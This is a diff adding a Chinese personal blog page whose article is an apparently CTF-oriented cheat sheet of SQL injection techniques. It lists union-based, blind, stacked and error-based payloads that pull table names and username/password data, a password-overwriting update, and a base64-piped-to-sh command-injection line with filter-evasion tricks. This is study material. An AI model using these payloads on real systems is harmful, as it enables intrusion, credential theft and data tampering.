@@ -1,0 +1,215 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pfortunew | pfortunew</title><meta name="author" content="pmj"><meta name="copyright" content="pmj"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="sql注入存在md5加密ffifdyop 经过md5加密后 变成276f722736c95d99e921722cf9ed621c，mysql能将16进制转换为字符，变成   ‘or’6ɝ⬹   ，一个永真式，万能密码 $IFS$9:CTF中若space被过滤了，用来代表space以分割字符&#x2F;单词。这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pfortunew">
+<meta property="og:url" content="http://example.com/2024/04/11/sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="pfortunew">
+<meta property="og:description" content="sql注入存在md5加密ffifdyop 经过md5加密后 变成276f722736c95d99e921722cf9ed621c，mysql能将16进制转换为字符，变成   ‘or’6ɝ⬹   ，一个永真式，万能密码 $IFS$9:CTF中若space被过滤了，用来代表space以分割字符&#x2F;单词。这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/202404021712064350774422.jpg">
+<meta property="article:published_time" content="2024-04-11T11:43:47.418Z">
+<meta property="article:modified_time" content="2024-04-11T11:43:36.814Z">
+<meta property="article:author" content="pmj">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/202404021712064350774422.jpg"><link rel="shortcut icon" href="/img/202404021712064350774422.jpg"><link rel="canonical" href="http://example.com/2024/04/11/sql%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pfortunew',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-11 19:43:36'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/./img/202404021712064350774422.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="pfortunew"><span class="site-name">pfortunew</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-11T11:43:47.418Z" title="发表于 2024-04-11 19:43:47">2024-04-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-11T11:43:36.814Z" title="更新于 2024-04-11 19:43:36">2024-04-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>5分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h3 id="存在md5加密"><a href="#存在md5加密" class="headerlink" title="存在md5加密"></a>存在md5加密</h3><p><strong>ffifdyop</strong> 经过md5加密后 变成276f722736c95d99e921722cf9ed621c，mysql能将16进制转换为字符，变成   ‘or’6ɝ⬹   ，一个永真式，万能密码</p>
+<h3 id="IFS-9-CTF中若space被过滤了，用来代表space以分割字符-单词。"><a href="#IFS-9-CTF中若space被过滤了，用来代表space以分割字符-单词。" class="headerlink" title="$IFS$9:CTF中若space被过滤了，用来代表space以分割字符&#x2F;单词。"></a><strong><code>$IFS$9</code></strong>:CTF中若space被过滤了，用来代表space以分割字符&#x2F;单词。</h3><p>这里解释一下${IFS},$IFS,$IFS$9的区别，首先$IFS在linux下表示分隔符，只有cat$IFSa.txt的时候,bash解释器会把整个IFSa当做变量名，所以导致没有办法运行，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，而$9指的是当前系统shell进程的第九个参数的持有者，就是一个空字符串，因此$9相当于没有加东西，等于做了一个前后隔离。</p>
+<h3 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h3><p><strong>判断注入</strong><br>1 or 1&#x3D;1 数字型注入<br>1’ or ‘1’&#x3D;’1’ 字符型注入<br>1” or “1”&#x3D;”1” 字符型注入</p>
+<p><strong>猜SQL查询语句中的字段数</strong><br>1’ order by 2 #</p>
+<p><strong>获取当前数据库</strong><br>1’ union select 1,database() #</p>
+<p><strong>获取数据库中的表</strong><br>xx’ union select 1,group_concat(table_name） from information_schema.tables where table_schema&#x3D;’数据库名’ #</p>
+<p><strong>获取表中字段名</strong><br>xx’ union select 1,group_concat(column_name） from information_schema.columns where table_name&#x3D;’users’ #</p>
+<p><strong>查看数据</strong><br>xx’ union select username,password from users #</p>
+<p>**(     ‘’%0a’’     ‘’&#x2F;&#x2F;‘’   ‘’%0b’’   ‘’%09’’    ‘’%0c’’  ‘’()’’    “%0d”  “%00”   )  &#x3D;&#x3D;&#x3D;&gt;代替空格  ****</p>
+<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p>database()  数据库名<br>version()   数据库版本<br>count()    返回执行结果数量<br>concat()    没有分隔符的链接字符串<br><strong>group_concat()</strong>   连接一个组的所有字符串，并以逗号分隔每一条数据<br><strong>into outfile</strong>     写文件<br>ascii()      字符串的ASCII代码值<br>ord()     返回字符串第一个字符的ASCII值<br>mid()     返回一个字符串的一部分<br>substr()    返回一个字符串的一部分<br>left()     返回字符串最左面几个字符<br>char()    返回整数ASCII代码字符组成的字符串<br>strcmp()       比较字符串内容<br>ifnull()     假如参数1不为NULL，则返回值为参数1，否则其返回值为参数2<br>exp()      返回e的x次方, 当参数过大时会因为溢出2而报错</p>
+<p>**extractvalue()**：（报错注入）</p>
+<p>第一个参数:XML_docment是String格式，为XML文档对象的名称，文中为Doc</p>
+<p>第二个参数：XPath_string(Xpath格式的字符串)</p>
+<p>作用：从目标XML中返回包含所查询值的字符串</p>
+<p>**updatexml()**：（报错注入）</p>
+<p>第一个参数:XML_docment是String格式，为XML文档对象的名称，文中为Doc</p>
+<p>第二个参数：Xpath_string(Xpath格式的字符串)</p>
+<p>第三个参数:new_value,String格式，替换查找到的符合条件的数据target.com</p>
+<p>作用:改变文档中符合条件的节点的值</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="1、left-函数"><a href="#1、left-函数" class="headerlink" title="1、left()函数"></a>1、left()函数</h4><p>left(database(),1)&gt;’s’</p>
+<p>database()显示数据库名称,left(a,b)从左侧截取a的前b位</p>
+<h4 id="2、regexp"><a href="#2、regexp" class="headerlink" title="2、regexp"></a>2、regexp</h4><p>select user() regexp(“r”)</p>
+<p>正则表达式的用法user()结果为root,regexp为匹配root的正则表达式</p>
+<h4 id="3、like"><a href="#3、like" class="headerlink" title="3、like"></a>3、like</h4><p>select user() like’^ro%’</p>
+<p>与regexp类似，使用like进行匹配</p>
+<h4 id="4、substr-函数-ascii-函数"><a href="#4、substr-函数-ascii-函数" class="headerlink" title="4、substr()函数 ascii()函数"></a>4、substr()函数 ascii()函数</h4><p>substr()函数 ascii(substr((select database()),1,1))&lt;&gt;98</p>
+<p>substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将某个字符转换为ascii值</p>
+<h4 id="5、ord-函数-mid-函数"><a href="#5、ord-函数-mid-函数" class="headerlink" title="5、ord()函数 mid()函数"></a>5、ord()函数 mid()函数</h4><p>ord(mid((select user()),1,1))&#x3D;114</p>
+<p>mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii(),将字符转为ascii值</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>if(left(user(),1)&#x3D;’a’,0,sleep(3));</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p> 以   ‘ <strong>;</strong> ’   结束一条sql语句，多条sql语句一起执行</p>
+<p><code>1&#39; union select 1,2,3;update users set password=123 where id=1--+</code></p>
+<p>1’;show databases;#</p>
+<p>1’;show tables;#</p>
+<p>1’;show columns from <code>1919810931114514</code>;#<br>(纯数字需要用反引号  &#96;&#96; 包裹)</p>
+<p><strong>（bash被过滤了，所以用sh）<br>&#x2F;?ip&#x3D;127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</strong></p>
+<p>（Y2F0IGZsYWcucGhw  &#x3D;&#x3D;&gt;  cat flag.php）</p>
+<h3 id="handler-mysql特有"><a href="#handler-mysql特有" class="headerlink" title="handler(mysql特有)"></a>handler(mysql特有)</h3><p>使用handler语句，进行浏览表的数据</p>
+<p>1’;handler <code>1919810931114514</code> open;handler <code>1919810931114514</code> read next;#</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml()函数"></a><strong>updatexml()函数</strong></h4><p>语法：updatexml(xml_document,<strong>XPathstring</strong>,new_value)<br>第一个参数是字符串string(XML文档对象的名称)<br>第二个参数是指定字符串中的一个位置（Xpath格式的字符串）<br>第三个参数是将要替换成什么<br>string格式 Xpath定位必须是有效的，否则则会发生错误。我们就能利用这个特性爆出我们想要的数据</p>
+<p>实例：</p>
+<p> <strong>?id&#x3D;1’ or updatexml(0,concat(0x7e,select database()),1)#</strong></p>
+<p>查表名（过滤空格）：**?username&#x3D;1’or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),1))#**</p>
+<p>查列名：<strong>1’or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’))),1))#</strong> </p>
+<p>查数据：<strong>1’or(updatexml(1,concat(0x7e,(select(group_concat(id,0x7e,username,0x7e,password))from(H4rDsq1))),1))#</strong> </p>
+<p>可能因为长度的限制，使用right函数来获取另一半<br><strong>1’or(updatexml(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1))),1))#</strong> </p>
+<h4 id="extractvalue-函数"><a href="#extractvalue-函数" class="headerlink" title="extractvalue()函数"></a><strong>extractvalue()函数</strong></h4><p>extractvalue (XML_document, <strong>XPath_string</strong>);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为doc<br> 第二个参数：XPath_string(Xpath格式的字符串)，Xpath定位必须是有效的，否则会发生错误</p>
+<p>extractvalue()函数的作用是从目标xml中返回包含所查询值的字符串 </p>
+<p>实例：</p>
+<p><strong>1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) #</strong></p>
+<h4 id="floor-函数"><a href="#floor-函数" class="headerlink" title="floor()函数"></a><strong>floor()函数</strong></h4><p>floor()是mysql的一个取整函数</p>
+<p>实例：</p>
+<p>*<em>id&#x3D;1’ union select count(</em>),concat(floor(rand(0)<em>2),database()) x from information_schema.schemata group by x #</em>*</p>
+<h3 id="设置-sql-mode-PIPES-AS-CONCAT来转换操作符的作用。（sql-mode设置）"><a href="#设置-sql-mode-PIPES-AS-CONCAT来转换操作符的作用。（sql-mode设置）" class="headerlink" title="设置 sql_mode&#x3D;PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置）"></a>设置 <strong>sql_mode&#x3D;PIPES_AS_CONCAT</strong>来转换操作符的作用。（sql_mode设置）</h3><h3 id="利用PIPES-AS-CONCAT令-起到连接符的作用。"><a href="#利用PIPES-AS-CONCAT令-起到连接符的作用。" class="headerlink" title="利用PIPES_AS_CONCAT令||起到连接符的作用。"></a>利用PIPES_AS_CONCAT令||起到连接符的作用。</h3><h3 id="alter"><a href="#alter" class="headerlink" title="alter"></a>alter</h3><p><strong>修改表名：ALTER TABLE 旧表名 RENAME TO 新表名；</strong></p>
+<p><strong>修改字段：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</strong></p>
+<p><strong>1’;alter table words rename to word;alter table</strong> <code>1919810931114514</code> rename to words;alter table words change flag data varchar(100);alter table words add column id int(10);#</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">pmj</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/04/11/sql%E6%B3%A8%E5%85%A5/">http://example.com/2024/04/11/sql%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">pfortunew</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/./img/202404021712064350774422.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/04/09/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Hello World</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/./img/202404021712064350774422.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">pmj</div><div class="author-info__description">求知</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/pwfortune" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/2302_80472909?spm=1000.2115.3001.5343" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:3058986501@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: ;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%9C%A8md5%E5%8A%A0%E5%AF%86"><span class="toc-number">1.0.1.</span> <span class="toc-text">存在md5加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IFS-9-CTF%E4%B8%AD%E8%8B%A5space%E8%A2%AB%E8%BF%87%E6%BB%A4%E4%BA%86%EF%BC%8C%E7%94%A8%E6%9D%A5%E4%BB%A3%E8%A1%A8space%E4%BB%A5%E5%88%86%E5%89%B2%E5%AD%97%E7%AC%A6-%E5%8D%95%E8%AF%8D%E3%80%82"><span class="toc-number">1.0.2.</span> <span class="toc-text">$IFS$9:CTF中若space被过滤了，用来代表space以分割字符&#x2F;单词。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.0.3.</span> <span class="toc-text">一般步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.4.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.5.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81left-%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.5.1.</span> <span class="toc-text">1、left()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81regexp"><span class="toc-number">1.0.5.2.</span> <span class="toc-text">2、regexp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81like"><span class="toc-number">1.0.5.3.</span> <span class="toc-text">3、like</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81substr-%E5%87%BD%E6%95%B0-ascii-%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.5.4.</span> <span class="toc-text">4、substr()函数 ascii()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81ord-%E5%87%BD%E6%95%B0-mid-%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.5.5.</span> <span class="toc-text">5、ord()函数 mid()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.6.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.7.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#handler-mysql%E7%89%B9%E6%9C%89"><span class="toc-number">1.0.8.</span> <span class="toc-text">handler(mysql特有)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.9.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.9.1.</span> <span class="toc-text">updatexml()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.9.2.</span> <span class="toc-text">extractvalue()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#floor-%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.9.3.</span> <span class="toc-text">floor()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE-sql-mode-PIPES-AS-CONCAT%E6%9D%A5%E8%BD%AC%E6%8D%A2%E6%93%8D%E4%BD%9C%E7%AC%A6%E7%9A%84%E4%BD%9C%E7%94%A8%E3%80%82%EF%BC%88sql-mode%E8%AE%BE%E7%BD%AE%EF%BC%89"><span class="toc-number">1.0.10.</span> <span class="toc-text">设置 sql_mode&#x3D;PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8PIPES-AS-CONCAT%E4%BB%A4-%E8%B5%B7%E5%88%B0%E8%BF%9E%E6%8E%A5%E7%AC%A6%E7%9A%84%E4%BD%9C%E7%94%A8%E3%80%82"><span class="toc-number">1.0.11.</span> <span class="toc-text">利用PIPES_AS_CONCAT令||起到连接符的作用。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#alter"><span class="toc-number">1.0.12.</span> <span class="toc-text">alter</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/11/sql%E6%B3%A8%E5%85%A5/" title="无题">无题</a><time datetime="2024-04-11T11:43:47.418Z" title="发表于 2024-04-11 19:43:47">2024-04-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/09/hello-world/" title="Hello World">Hello World</a><time datetime="2024-04-09T15:20:12.415Z" title="发表于 2024-04-09 23:20:12">2024-04-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By pmj</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
